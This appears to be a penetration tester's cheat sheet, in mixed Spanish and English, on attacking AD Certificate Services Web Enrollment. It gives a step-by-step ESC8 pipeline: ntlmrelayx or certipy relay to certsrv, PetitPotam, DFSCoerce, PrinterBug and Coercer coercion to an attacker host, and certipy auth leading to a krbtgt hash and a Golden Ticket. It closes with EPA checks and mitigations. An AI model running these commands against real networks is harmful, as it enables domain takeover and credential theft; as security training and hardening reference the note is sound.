---
aliases:
  - Web Enrollment ADCS
  - certsrv
  - ESC8 NTLM Relay
  - NDES SCEP
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - ADCS Enumeration]]"
  - "[[NTLM Relay]]"
---
# AD - ADCS Enumeration - Web Enrollment & Relay

***

## Web Enrollment Endpoints

| **Endpoint** | **Path** | **Para qué** |
|:---:|:---:|:---:|
| Default certsrv | `/certsrv/` | Web Enrollment landing. |
| Cert request | `/certsrv/certfnsh.asp` | Submit cert request (ESC8 target). |
| Cert request UI | `/certsrv/certrqxt.asp` | Manual cert UI. |
| Cert pending | `/certsrv/certqus.asp` | Pending requests. |
| NDES (SCEP) | `/certsrv/mscep/mscep.dll` | Mobile/IoT cert provisioning. |
| NDES admin | `/certsrv/mscep_admin/` | NDES admin UI. |
^ad-webenroll-endpoints

```bash
# Probe endpoints
for url in "/certsrv/" "/certsrv/certfnsh.asp" "/certsrv/certrqxt.asp" "/certsrv/mscep/mscep.dll"; do
  echo "=== $url ==="
  curl -ksI "https://<CA-host>$url" | head -3
done
```

___

## ESC8 (NTLM Relay)

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identify Web Enrollment habilitado HTTP (sin EPA) | `curl -ksI http://<CA-host>/certsrv/` | Pre-attack. |
| 2. Setup `ntlmrelayx` con `--adcs` | `ntlmrelayx.py -t http://<CA-host>/certsrv/certfnsh.asp --adcs --template DomainController` | Relay listener. |
| 3. Coercer victim auth contra atacante (PetitPotam, PrinterBug, DFSCoerce) | `PetitPotam.py -u u -p pass <attacker-IP> <victim>` | Trigger NTLM auth. |
| 4. ntlmrelayx forwards auth → CA emite cert para victim | Auto | Standard. |
| 5. Save cert (PFX) → auth via PKINIT | `certipy auth -pfx <cert>.pfx -dc-ip <DC>` | DCSync as victim. |
^ad-webenroll-esc8

```bash
# Pipeline completo ESC8 contra DC
# Terminal 1: ntlmrelayx
ntlmrelayx.py -t http://<CA-host>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Terminal 2: PetitPotam
python3 PetitPotam.py -u corp/u -p pass <attacker-IP> <DC-IP>

# ntlmrelayx output: cert PEM para DC$
# Save → auth
certipy auth -pfx dc01.pfx -dc-ip <DC>
# Output: NT hash krbtgt → Golden Ticket
```

___

## NDES (SCEP) Endpoint

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -k https://<CA-host>/certsrv/mscep/mscep.dll` | NDES endpoint accesible | Mobile/IoT enrollment. |
| `curl -k https://<CA-host>/certsrv/mscep_admin/` | NDES admin UI (challenge generator) | Audit access. |
| Pre-shared challenge phrase abuse | Static challenge → mass enrollment | Edge. |
^ad-webenroll-ndes

___

## Channel Binding (EPA)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -ksI https://<CA-host>/certsrv/certfnsh.asp` | Headers (busca `WWW-Authenticate: Negotiate`) | Test channel binding. |
| IIS Manager → Auth Settings → `Extended Protection` setting | EPA status | Defender side check. |
| `Get-WebConfigurationProperty -Filter "/system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection"` (en CA host) | EPA via PowerShell | Per-host. |
^ad-webenroll-epa

**Por qué importa:** EPA (Extended Protection for Authentication) **bloquea NTLM relay** sobre HTTPS. Si el CA tiene HTTPS + EPA Required = ESC8 mitigado. Hardening recomendado.

___

## SMB Signing Cross-Correlate

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <CA-host> --signing` | Signing required vs not | Pre-attack (ESC8 viable solo si signing optional en victim source). |
| `nxc smb <relay-targets> --gen-relay-list relay.txt` | Hosts sin signing | Relay candidates. |
^ad-webenroll-smbcross

**Note:** ESC8 specific es HTTP relay → CA. SMB signing del CA no afecta. Pero si querés relay desde SMB → HTTP, el source SMB necesita ser unsigned.

___

## Coercion Sources

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `PetitPotam.py -u u -p pass <attacker-IP> <victim>` | MS-EFSR coercion | Standard (CVE-2021-36942 patches). |
| `dfscoerce.py -u u -p pass <attacker-IP> <victim>` | MS-DFSNM coercion | Si PetitPotam patched. |
| `SpoolSample.exe <victim> <attacker>` | PrinterBug (MS-RPRN) | Print Spooler enabled. |
| `Coercer.py coerce -t <victim> -l <attacker> -u u -p pass -d corp.local` | Multi-method auto | Comprehensive. |
| `CheeseOunce.py` (Auth Coercion via authIP) | IPSec coercion | Edge modern. |
^ad-webenroll-coercion

```bash
# Auto-detect viable coercion methods
python3 Coercer.py scan -t <victim> -u corp/u -p pass

# Trigger
python3 Coercer.py coerce -t <victim> -l <attacker-IP> -u corp/u -p pass -d corp.local
```

___

## Modern certipy Relay

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `certipy relay -target http://<CA-host> -ca <CA-name> -template DomainController` | Built-in relay listener | All-in-one. |
| `certipy relay -target rpc://<CA-host>` | RPC relay (sin HTTP) | Modern alt. |
^ad-webenroll-certipy-relay

```bash
# Modern certipy approach
certipy relay -target http://<CA-host> -ca <CA-name> -template DomainController
# Coerce desde otra terminal → certipy auto-receives + emits cert
```

___

## Mitigations

| **Comando / Setting** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| Disable HTTP Web Enrollment (HTTPS only) | IIS Manager | Critical fix. |
| Enable EPA (Extended Protection) en `/certsrv/` | IIS auth settings → Extended Protection: Required | ESC8 fix. |
| Enable SMB signing required en CA host | GPO / local policy | Adjacent. |
| Patch PetitPotam (KB5005413, Aug 2021) | Standard patches | Coercion mitigation. |
| Patch PrinterBug (Disable Print Spooler en DCs) | `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled` | DC hardening. |
| Patch DFSCoerce (KB5018425+) | Standard | Modern. |
| `LmCompatibilityLevel = 5` | Force NTLMv2 only | Hardening. |
| `RestrictNTLM` GPO | Block NTLM auth en DC entirely | Aggressive hardening. |
^ad-webenroll-mitigations

***
